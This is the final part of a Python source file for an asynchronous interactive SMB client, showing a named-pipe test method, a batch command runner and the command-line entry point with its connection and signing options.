			return True, None
		except Exception as e:
			return self.handle_exception(e)

	async def do_pipetest(self, data = 'HELLO!'):
		""" pipetest """
		async def temp(pipe):
			try:
				await asyncio.sleep(5)
				data = 'HELLO!!!\r\n'.encode('utf-8')
				data = len(data).to_bytes(4, byteorder='little', signed=False) + data
				while True:
					_, err = await pipe.write(data)
					if err is not None:
						raise err
					await asyncio.sleep(1)

			except:
				traceback.print_exc()
		
		pipe = None
		try:
			
			pipe = SMBFile.from_uncpath('\\\\%s\\IPC$\\%s' % (self.connection.target.get_hostname_or_ip(), 'testpipe'))
			
			_, err = await pipe.open_pipe(self.connection, 'rw')
			if err is not None:
				raise err

			data = bytes.fromhex('00000022000570b75f7cf1897fd2a679b70e9a46d5475443500004acd9a84e005001')
			_, err = await pipe.write(data)
			if err is not None:
				raise err
			
			#asyncio.create_task(temp(pipe))
			while True:
				data, err = await pipe.read(4)
				if err is not None:
					raise err
				print(data)
				await asyncio.sleep(2)
			return True, None
		except Exception as e:
			return self.handle_exception(e)	
		finally:
			if pipe is not None:
				await pipe.close()
	

async def amain(smb_url:str, commands:List[str] = [], silent:bool = False, continue_on_error:bool = False, no_interactive:bool=False, nosig:bool=False):
	client = SMBClient(smb_url, silent = silent, nosig=nosig)
	if len(commands) == 0:
		if no_interactive is True:
			print('Not starting interactive!')
			sys.exit(1)
		_, err = await client._run_single_command('login', [])
		if err is not None:
			sys.exit(1)
		await client.run()
	else:
		try:
			for command in commands:
				if command == 'i':
					await client.run()
					sys.exit(0)
				
				cmd = shlex.split(command)
				if cmd[0] == 'login':
					_, err = await client.do_login()
					if err is not None:
						sys.exit(1)
					continue
				
				print('>>> %s' % command)
				_, err = await client._run_single_command(cmd[0], cmd[1:])
				if err is not None and continue_on_error is False:
					print('Batch execution stopped early, because a command failed!')
					sys.exit(1)
			sys.exit(0)
		finally:
			await client.do_logout()

def main():
	import argparse
	import platform
	import logging
	from asysocks import logger as asylogger
	from asyauth import logger as asyauthlogger
	
	parser = argparse.ArgumentParser(description='Interactive SMB client')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('-s', '--silent', action='store_true', help='do not print banner')
	parser.add_argument('-n', '--no-interactive', action='store_true')
	parser.add_argument('-c', '--continue-on-error', action='store_true', help='When in batch execution mode, execute all commands even if one fails')
	parser.add_argument('--nosig', action='store_true', help='Disable SMB signing (SMB2 only)')
	parser.add_argument('smb_url', help = 'Connection string that describes the authentication and target. Example: smb+ntlm-password://TEST\\Administrator:password@10.10.10.2')
	parser.add_argument('commands', nargs='*')
	
	args = parser.parse_args()
	if args.silent is False:
		print(__banner__)

	if args.verbose >=1:
		logger.setLevel(logging.DEBUG)
		asyauthlogger.setLevel(logging.DEBUG)

	if args.verbose > 2:
		print('setting deepdebug')
		logger.setLevel(1) #enabling deep debug
		sockslogger.setLevel(1)
		asylogger.setLevel(1)
		asyauthlogger.setLevel(1)
		asyncio.get_event_loop().set_debug(True)
		logging.basicConfig(level=logging.DEBUG)

	asyncio.run(
		amain(
			args.smb_url,
			args.commands, 
			args.silent, 
			args.continue_on_error, 
			args.no_interactive,
			args.nosig
		)
	)

if __name__ == '__main__':
	main()
	
	

	